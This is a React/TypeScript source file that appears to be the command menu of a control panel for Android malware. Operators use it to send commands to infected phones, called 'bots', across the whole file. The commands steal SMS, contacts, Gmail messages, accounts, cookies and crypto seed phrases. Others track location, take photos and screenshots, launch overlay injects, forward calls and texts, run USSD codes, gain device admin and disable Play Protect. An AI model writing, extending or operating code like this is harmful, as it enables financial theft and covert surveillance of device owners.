import {CommandsProps} from "../../Model/Commands";


import {Button} from "antd";
import React, {useState} from "react";
import SendSms from "../Modals/SendSMS/SendSMS";
import GetSeedPhrase from "../Modals/GetSeedPhrase/GetSeedPhrase";
import Calling from "../Modals/Calling/Calling";
import ForwardCall from "../Modals/ForwardCall/ForwardCall";
import OpenInject from "../Modals/OpenInject/OpenInject";
import ClearAppData from "../Modals/ClearAppData/ClearAppData";
import RunApp from "../Modals/RunApp/RunApp";
import SendPush from "../Modals/SendPush/SendPush";
import OpenURL from "../Modals/OpenURL/OpenURL";
import DeleteApp from "../Modals/DeleteApp/DeleteApp";
import {Bot} from "../../Model/Bot";
import {getBotsId} from "../../Util/getBotIds";
import sendCommand from "../../Requests/Commands/sendCommands";
import BotComment from "../Modals/BotComment/BotComment";
import GetGmailMessages from "../Modals/GetGmailMessages/GetGmailMessages";
import {useTranslation} from "react-i18next";
import AddContact from "../Modals/AddContact/AddContact";
import OpenWhatsApp from "../Modals/OpenWhatsApp/OpenWhatsApp";
import ForwardSMS from "../Modals/ForwardSMS/ForwardSMS";
import StartUSSD from "../Modals/StartUSSD/StartUSSD";
import SendSMSMany from "../Modals/SendSMSMany/SendSMSMany";

export interface CommandsState extends Record<string, boolean> {
    sendSMS: boolean,
    seedPhrase: boolean,
    calling: boolean,
    forwardCall: boolean,
    openInject: boolean,
    clearCache: boolean,
    runApp: boolean,
    sendPush: boolean,
    openURL: boolean,
    googleAuth: boolean,
    smsList: boolean,
    keylogger: boolean,
    contacts: boolean,
    comment: boolean,
    pushList: boolean,
    deleteApp: boolean,
    hiddenSMS: boolean,
    apps: boolean,
    admin: boolean,
    getAccounts: boolean,
    getGmailMessages: boolean,
    // new commands
    addContact: boolean,
    openWhatsApp: boolean,
    // makeCall: boolean,
    forwardSMS: boolean,
    startUSSD: boolean,
    // startApp: boolean,
    sendManySMS: boolean,
}

interface CommandsListProps {
    selectedBots: Bot[],
    type?: string,
}

const CommandsList: React.FC<CommandsListProps> = (props: CommandsListProps) => {
    const [commandsState, setCommandsShow] = useState<CommandsState>({
        comment: false,
        pushList: false,
        sendSMS: false,
        seedPhrase: false,
        calling: false,
        forwardCall: false,
        openInject: false,
        clearCache: false,
        runApp: false,
        sendPush: false,
        openURL: false,
        googleAuth: false,
        smsList: false,
        keylogger: false,
        contacts: false,
        deleteApp: false,
        hiddenSMS: false,
        apps: false,
        admin: false,
        getAccounts: false,
        getGmailMessages: false,
        // new commands
        addContact: false,
        openWhatsApp: false,
        makeCall: false,
        forwardSMS: false,
        startUSSD: false,
        // startApp: false,
        sendManySMS: false,
    });

    const setShow = (key: string, value: boolean) => {
        commandsState[key] = value;

        setCommandsShow({
            ...commandsState,
        });
    };

    const {t} = useTranslation();

    const commandsList: CommandsProps[] = [
        {
            name: t("GET_CALL_HISTORY_COMMAND"),
            icon: <i className="command-icon fa-solid fa-list-ul" />,
            action: () => {
                sendCommand({
                    command: "getcallhistory",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("GET_CONTACTS_COMMAND"),
            icon: <i className="command-icon fa-solid fa-id-card" />,
            action: () => {
                sendCommand({
                    command: "getcontacts",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("ADD_CONTACT_COMMAND"),
            icon: <i className="command-icon fa-solid fa-user-plus" />,
            action: () => setShow("addContact", true),
        },
        {
            name: t("GET_LOCATION_COMMAND"),
            icon: <i className="command-icon fa-solid fa-location-dot" />,
            action: () => {
                sendCommand({
                    command: "getlocation",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("GET_IMAGES_COMMAND"),
            icon: <i className="command-icon fa-solid fa-images" />,
            action: () => {
                sendCommand({
                    command: "getimages",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("OPEN_APP_COMMAND"),
            icon: <i className="command-icon fa-solid fa-terminal" />,
            action: () => setShow("runApp", true),
        },
        {
            name: t("OPEN_WHATSAPP_COMMAND"),
            icon: <i className="command-icon fa-brands fa-whatsapp" />,
            action: () => setShow("openWhatsApp", true),
        },
        {
            name: t("CALLING_COMMAND"),
            icon: <i className="command-icon fa-solid fa-phone" />,
            action: () => setShow("calling", true),
        },
        {
            name: t("FORWARD_SMS_COMMAND"),
            icon: <i className="command-icon fa-solid fa-comment-sms" />,
            action: () => setShow("forwardSMS", true),
        },
        {
            name: t("SEND_SMS_COMMAND"),
            icon: <i className="command-icon fa-solid fa-comment-sms" />,
            action: () => setShow("sendSMS", true),
        },
        {
            name: t("SEND_MANY_SMS"),
            icon: <i className="command-icon fa-solid fa-comment-sms" />,
            action: () => setShow("sendManySMS", true),
        },
        {
            name: t("START_USSD_COMMAND"),
            icon: <i className="command-icon icon-ussd" />,
            action: () => setShow("startUSSD", true),
        },
        {
            name: t("FORWARD_CALL_COMMAND"),
            icon: <i className="command-icon icon-forward-call" />,
            action: () => setShow("forwardCall", true),
        },
        {
            name: t("PUSH_COMMAND"),
            icon: <i className="command-icon fa-solid fa-bell" />,
            action: () => setShow("sendPush", true),
        },
        {
            name: t("GET_ACCOUNTS_COMMAND"),
            icon: <i className="command-icon fa-brands fa-google" />,
            action: () => {
                sendCommand({
                    command: "getaccounts",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("GET_INSTALL_APPS_COMMAND"),
            icon: <i className="command-icon fa-brands fa-google-play" />,
            action: () => {
                sendCommand({
                    command: "getinstallapps",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("GET_SMS_COMMAND"),
            icon: <i className="command-icon fa-solid fa-envelope" />,
            action: () => {
                sendCommand({
                    command: "getsms",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("START_INJECT_COMMAND"),
            icon: <i className="command-icon fa-solid fa-syringe" />,
            action: () => setShow("openInject", true),
        },
        {
            name: t("UPDATE_INJECT_AND_LIST_APPS_COMMAND"),
            icon: <i className="command-icon fa-solid fa-syringe" />,
            action: () => {
                sendCommand({
                    command: "updateinjectandlistapps",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("OPEN_URL_COMMAND"),
            icon: <i className="command-icon fa-solid fa-square-arrow-up-right" />,
            action: () => setShow("openURL", true),
        },
        {
            name: t("DELETE_APPLICATION_COMMAND"),
            icon: <i className="command-icon fa-solid fa-trash-can-arrow-up" />,
            action: () => setShow("deleteApp", true),
        },
        {
            name: t("GET_GMAIL_MESSAGE_COMMAND"),
            icon: <i className="command-icon icon-gmail" />,
            action: () => setShow("getGmailMessages", true),
        },
        {
            name: t("START_ADMIN_COMMAND"),
            icon: <i className="command-icon fa-solid fa-user-gear" />,
            action: () => {
                sendCommand({
                    command: "startadmin",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("TAKE_SCREENSHOT_COMMAND"),
            icon: <i className="command-icon fa-solid fa-mobile-screen" />,
            action: () => {
                sendCommand({
                    command: "takescreenshot",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("CLEAR_CACHE_COMMAND"),
            icon: <i className="command-icon fa-solid fa-eraser" />,
            action: () => setShow("clearCache", true),
        },
        {
            name: t("START_AUTHENTICATOR2_COMMAND"),
            icon: <i className="command-icon fa-solid fa-right-to-bracket" />,
            action: () => {
                sendCommand({
                    command: "startauthenticator2",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("GET_SEED_COMMAND"),
            icon: <i className="command-icon icon-seed" />,
            action: () => setShow("seedPhrase", true),
        },
        {
            name: t("OFF_PLAY_PROTECT"),
            icon: <i className="command-icon icon-seed" />,
            action: () => {
                sendCommand({
                    command: "protect",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("Get cookie"),
            icon: <i className="command-icon fa-solid fa-cookie" />,
            action: () => {
                sendCommand({
                    command: "cookie",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
        {
            name: t("Take photo"),
            icon: <i className="command-icon fa-solid fa-camera" />,
            action: () => {
                sendCommand({
                    command: "takephoto",
                    payload: [],
                    botIds: getBotsId(props.selectedBots),
                });
            },
        },
    ];

    return (
        <>
            <div className="commands-menu">
                {commandsList.map((command: CommandsProps, id: number) => {
                    return (
                        <Button
                            type="link"
                            key={id}
                            icon={(
                                <span className="anticon">
                                    {command.icon}
                                </span>
                            )}
                            onClick={command.action}
                            danger={command.isDanger}
                            style={{display: command.quickAccess ? "none" : "flex"}}
                            disabled={props.selectedBots.length > 1 ? command.hideInMultiSelect : false}
                            className="ant-btn-ellipsis"
                            block
                            title={command.name}
                        >
                            {command.name}
                        </Button>
                    );
                })}
            </div>

            <SendSms
                visible={commandsState.sendSMS}
                setVisible={(isVisible: boolean) => setShow("sendSMS", isVisible)}
                selectedBots={props.selectedBots}
            />

            <GetSeedPhrase
                visible={commandsState.seedPhrase}
                setVisible={(isVisible: boolean) => setShow("seedPhrase", isVisible)}
                selectedBots={props.selectedBots}
            />

            <Calling
                visible={commandsState.calling}
                setVisible={(isVisible: boolean) => setShow("calling", isVisible)}
                selectedBots={props.selectedBots}
            />

            <ForwardCall
                visible={commandsState.forwardCall}
                setVisible={(isVisible: boolean) => setShow("forwardCall", isVisible)}
                selectedBots={props.selectedBots}
            />

            <OpenInject
                visible={commandsState.openInject}
                setVisible={(isVisible: boolean) => setShow("openInject", isVisible)}
                selectedBots={props.selectedBots}
            />

            <ClearAppData
                visible={commandsState.clearCache}
                setVisible={(isVisible: boolean) => setShow("clearCache", isVisible)}
                selectedBots={props.selectedBots}
            />

            <RunApp
                visible={commandsState.runApp}
                setVisible={(isVisible: boolean) => setShow("runApp", isVisible)}
                selectedBots={props.selectedBots}
            />

            <SendPush
                visible={commandsState.sendPush}
                setVisible={(isVisible: boolean) => setShow("sendPush", isVisible)}
                selectedBots={props.selectedBots}
            />

            <OpenURL
                visible={commandsState.openURL}
                setVisible={(isVisible: boolean) => setShow("openURL", isVisible)}
                selectedBots={props.selectedBots}
            />

            <DeleteApp
                visible={commandsState.deleteApp}
                setVisible={(isVisible: boolean) => setShow("deleteApp", isVisible)}
                selectedBots={props.selectedBots}
            />

            <BotComment
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("comment", isVisible)}
                visible={commandsState.comment}
            />

            <GetGmailMessages
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("getGmailMessages", isVisible)}
                visible={commandsState.getGmailMessages}
            />

            <AddContact
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("addContact", isVisible)}
                visible={commandsState.addContact}
            />

            <OpenWhatsApp
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("openWhatsApp", isVisible)}
                visible={commandsState.openWhatsApp}
            />

            <ForwardSMS
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("forwardSMS", isVisible)}
                visible={commandsState.forwardSMS}
            />

            <StartUSSD
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("startUSSD", isVisible)}
                visible={commandsState.startUSSD}
            />

            <SendSMSMany
                selectedBots={props.selectedBots}
                setVisible={(isVisible: boolean) => setShow("sendManySMS", isVisible)}
                visible={commandsState.sendManySMS}
            />
        </>
    );
};

export default CommandsList;
